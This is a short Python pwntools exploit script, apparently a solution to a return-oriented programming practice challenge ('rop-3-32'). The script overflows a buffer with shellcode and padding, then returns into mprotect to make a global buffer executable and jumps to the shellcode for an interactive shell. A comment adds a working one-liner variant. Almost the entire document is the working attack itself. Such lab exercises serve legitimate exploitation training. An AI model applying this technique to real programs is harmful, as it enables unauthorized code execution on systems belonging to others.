#!/usr/bin/env python

# this actually doesn't work.
# for some reason, doing the following command does work instead:
# $ python -c 'from pwn import *; f = open("shellcode.bin", "r"); shellcode = f.read().strip(); f.close(); buf = "aaaaaa" + shellcode + "A"*99 + p32(0x08048360) + p32(0x804a060+2) + p32(0x804a000) + p32(0x1000) + p32(7); print buf' > input
# $ (cat input; cat) | ./rop-3-32

from pwn import *

# syscalls:
"""
 0x08048360  mprotect@plt
"""
mprotect_addr = p32(0x08048360)

#other stuff:
global_var_area = p32(0x804a000)
g_buf_addr= p32(0x804a062)

# stack
"""
[shellcode][AAAAA....AAAA]
[&memprotect_addr] [&g_buf] [&global_var_area] [0x1000] [0x7]
"""

# get mi shellcode
f = open("rop-3-32.bin", "r")
shellcode = f.read().strip()
f.close()

buf = "aaaaaa" + shellcode + "A"*99
buf += mprotect_addr + g_buf_addr + global_var_area + p32(0x1000) + p32(7)

# run process and shellcode
p = process("./rop-3-32")
p.sendline(buf)
p.interactive()
